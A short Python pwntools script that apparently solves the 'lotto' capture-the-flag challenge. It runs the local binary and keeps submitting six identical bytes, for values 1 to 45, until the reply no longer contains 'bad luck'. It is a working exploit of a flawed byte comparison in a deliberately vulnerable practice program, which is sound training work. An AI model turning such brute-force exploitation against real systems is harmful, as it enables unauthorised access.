from pwn import *
p = process(executable='/home/lotto/lotto', argv=[])

print p.recv()
for i in range(1, 46):
	p.sendline("1")
	print p.recvuntil("Submit your 6 lotto bytes :")
	p.sendline(chr(i)*6)
	data = p.recvline(1024)
	data += p.recvline(1024)
	print data
	if "bad luck" in data:
		continue
	else:
		break

print p.recv()
